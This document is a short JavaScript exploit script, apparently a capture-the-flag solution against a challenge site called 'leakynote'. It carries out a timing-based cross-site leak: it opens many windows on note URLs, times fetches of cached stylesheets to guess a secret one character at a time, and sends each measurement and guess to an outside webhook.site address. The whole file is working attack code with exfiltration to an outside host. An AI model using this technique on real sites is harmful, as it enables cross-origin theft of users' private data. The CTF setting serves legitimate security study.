const BASE_URL = "https://leakynote.be.ax";

const HOOK_URL = "https://webhook.site/xxx-xxx-xxx-xxx";

const RESOURCE_URLS = [
  `${BASE_URL}/assets/normalize.css`,
  `${BASE_URL}/assets/milligram.css`,
];

const CHARS = "}abcdefghijklmnopqrstuvwxyz";
const TARGET_IDS = [
  "054df3428619e625",
  "65cc5405dc8564fe",
  "1b7d45634e27c873",
  "e29642c2832547df",
  "2d2d3cde1c8d7364",
  "3a698bdc7a5f3211",
  "2211714f4295a0d4",
  "b2731895c908a7ea",
  "ef351ad9299d2549",
  "25afaf7e395a0fbc",
  "88793de3d0858540",
  "f771b89bca721df6",
  "36e96ab2f0cb2d80",
  "66c3dc231da04d05",
  "9074846e39521d35",
  "170a2b9ab4640814",
  "86f4efd489ad6a03",
  "f6ee33af12dc5326",
  "b2b1e00655eccc83",
  "f305085f9fc390e7",
  "e40fbeb6bf596a8a",
  "6f86900c87d72a81",
  "55a5a41d390df24b",
  "c8e4b6abf8f818d4",
  "3f95bf8920a5fe33",
  "3d5d90d50f382a76",
  "08db4102b0147e35",
];
const START_I = 0;

const TRY_NUM = 3;
const WIN_NUM = 10;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const wait = (w) =>
  new Promise(async (resolve) => {
    while (true) {
      try {
        w.document;
      } catch {
        resolve();
        break;
      }
      await sleep(30);
    }
  });

const measureOne = async (url) => {
  const firstW = open(url);
  await wait(firstW);

  const ws = [];
  for (let i = 0; i < WIN_NUM; i++) {
    ws.push(open(url));
  }
  await Promise.all(ws.map((w) => wait(w)));

  let start = performance.now();
  await Promise.all(
    RESOURCE_URLS.map((u) =>
      fetch(u, {
        mode: "no-cors",
      })
    )
  );
  const end = performance.now();

  for (const w of ws) {
    w.close();
  }
  firstW.close();

  return end - start;
};

const measure = async (url) => {
  let avg = 0;
  for (let i = 0; i < TRY_NUM; i++) {
    const t = await measureOne(url);
    avg += t;
  }
  avg /= TRY_NUM;
  return avg;
};

const leakOne = async (id) => {
  const url = `${BASE_URL}/post.php?id=${id}`;
  return await measure(url);
};

const leak = async () => {
  await leakOne(TARGET_IDS[0]);
  await sleep(1500);

  let minT = 100000000;
  let minC;
  for (let i = START_I; i < CHARS.length; i++) {
    const c = CHARS[i];
    const t = await leakOne(TARGET_IDS[i]);
    if (t < minT) {
      minT = t;
      minC = c;
    }
    navigator.sendBeacon(
      HOOK_URL,
      JSON.stringify({ START_I, i, c, t, minC, minT })
    );
    await sleep(1500);
  }
  return minC;
};

const main = async () => {
  const nextC = await leak();
  navigator.sendBeacon(HOOK_URL + "/leak", nextC);
};
main();